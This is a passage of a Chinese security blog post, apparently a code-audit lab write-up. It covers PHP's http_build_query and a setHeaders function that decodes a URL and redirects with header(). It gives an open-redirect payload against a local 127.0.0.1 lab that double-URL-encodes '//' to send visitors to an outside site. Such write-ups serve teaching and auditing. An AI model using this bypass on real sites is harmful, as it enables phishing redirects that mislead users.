+<p>使用给出的关联（或下标）数组生成一个经过 URL-encode 的请求字符串。</p>
+<h3 id="参数-2"><a href="#参数-2" class="headerlink" title="参数"></a>参数</h3><ul>
+<li><p><code>query_data</code></p>
+<p>可以是数组或包含属性的对象。一个 <code>query_data</code> 数组可以是简单的一维结构，也可以是由数组组成的数组（其依次可以包含其它数组）。如果 <code>query_data</code> 是一个对象，只有 public 的属性会加入结果。</p>
+</li>
+<li><p><code>numeric_prefix</code></p>
+<p>如果在基础数组中使用了数字下标同时给出了该参数，此参数值将会作为基础数组中的数字下标元素的前缀。这是为了让 PHP 或其它 CGI 程序在稍后对数据进行解码时获取合法的变量名。</p>
+</li>
+<li><p><code>arg_separator</code></p>
+<p>除非指定并使用了这个参数，否则会用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ini.core.php#ini.arg-separator.output">arg_separator.output</a> 来分隔参数。</p>
+</li>
+<li><p><code>enc_type</code></p>
+<p>默认使用 *<em><code>PHP_QUERY_RFC1738</code>**。如果 <code>enc_type</code> 是 **<code>PHP_QUERY_RFC1738</code>**，则编码将会以 <a target="_blank" rel="noopener" href="http://www.faqs.org/rfcs/rfc1738">» RFC 1738</a> 标准和 <em>application/x-www-form-urlencoded</em> 媒体类型进行编码，空格会被编码成加号（</em>+<em>）。如果 <code>enc_type</code> 是 **<code>PHP_QUERY_RFC3986</code>**，将根据 <a target="_blank" rel="noopener" href="http://www.faqs.org/rfcs/rfc3986">» RFC 3986</a> 编码，空格会被百分号编码（</em>%20*）。</p>
+</li>
+</ul>
+<h3 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h3><p>返回一个 URL 编码后的字符串。</p>
+</blockquote>
+<p>4.然后调用 <strong>setHeaders</strong> 函数，首先解码 <strong>$url</strong> 参数，然后 <strong>header()</strong> 函数直接跳转 <strong>$url</strong></p>
+<p>比如要跳转到百度。</p>
+<p>我们要跳转到站外，就必须要加上<code>http</code>，所以，我们就可以利用题目中的一次URL解码加上本身浏览器对GET就有一次URL解码，对<code>//</code>进行<strong>二次URL编码</strong>，编码后为<code>%25%32%66%25%32%66</code>。</p>
+<p>payload:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/Shenji/day<span class="hljs-number">15</span>.php/https:%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>www.baidu.com?redirect=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/web/">web</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">[代码审计]zzcms8.3</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/05/18/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%99%BD%E8%99%8E%E5%92%8C%E6%9C%B1%E9%9B%80web%E9%83%A8%E5%88%86wp/">
+                        <span class="hidden-mobile">2020网鼎杯白虎和朱雀web部分wp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('vcomments', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "r1aoO2CU8pztHBXDkQYFikuI-gzGzoHsz",
+          app_key: "dJhm8HsnHbHaA1BVeojBc6MI",
+          placeholder: "Just go go",
+          path: window.location.pathname,
+          avatar: "mm",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
